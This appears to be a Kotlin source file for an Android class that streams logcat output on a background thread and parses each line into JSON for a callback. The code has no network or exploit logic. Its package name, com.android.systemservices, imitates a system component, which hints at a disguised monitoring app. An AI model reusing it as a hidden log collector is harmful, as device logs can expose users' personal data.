package com.android.systemservices

import android.util.Log
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader

class LogcatHelper {

    private val TAG = "LogcatHelper"

    @Volatile var streaming = false
    private var process: Process? = null
    private var thread: Thread? = null

    fun start(onLine: (JSONObject) -> Unit) {
        if (streaming) return
        streaming = true
        thread = Thread {
            var proc: Process? = null
            try {
                // -T 100: start with last 100 lines, then stream new ones
                proc = Runtime.getRuntime().exec(
                    arrayOf("logcat", "-v", "brief", "-T", "100")
                )
                process = proc
                val reader = BufferedReader(InputStreamReader(proc.inputStream))
                var line = reader.readLine()
                while (streaming && line != null) {
                    if (line.isNotBlank()) onLine(parseLine(line))
                    line = reader.readLine()
                }
            } catch (e: Exception) {
                if (streaming) Log.e(TAG, "logcat error: ${e.message}")
            } finally {
                streaming = false
                try { proc?.destroy() } catch (_: Exception) {}
                process = null
                thread  = null
            }
        }.also {
            it.isDaemon = true
            it.name = "Logcat"
            it.start()
        }
        Log.i(TAG, "Logcat stream started")
    }

    fun stop() {
        streaming = false
        try { process?.destroy() } catch (_: Exception) {}
        process = null
        thread?.interrupt()
        thread = null
        Log.i(TAG, "Logcat stream stopped")
    }

    // Parse brief format: "I/Tag( pid): message" or "D/Tag(pid): message"
    private fun parseLine(line: String): JSONObject {
        val obj = JSONObject()
        obj.put("raw", line)
        try {
            val levelChar = line[0]
            val level = when (levelChar) {
                'V' -> "verbose"
                'D' -> "debug"
                'I' -> "info"
                'W' -> "warn"
                'E' -> "error"
                'F' -> "fatal"
                else -> "unknown"
            }
            obj.put("level", level)
            val slashIdx = line.indexOf('/')
            val parenIdx = line.indexOf('(')
            val colonIdx = line.indexOf(')')
            if (slashIdx > 0 && parenIdx > slashIdx && colonIdx > parenIdx) {
                obj.put("tag", line.substring(slashIdx + 1, parenIdx).trim())
                obj.put("pid", line.substring(parenIdx + 1, colonIdx).trim())
                val msgStart = line.indexOf(':', colonIdx) + 1
                if (msgStart > 0 && msgStart < line.length) {
                    obj.put("msg", line.substring(msgStart).trimStart())
                }
            }
        } catch (_: Exception) {}
        obj.put("ts", System.currentTimeMillis())
        return obj
    }
}
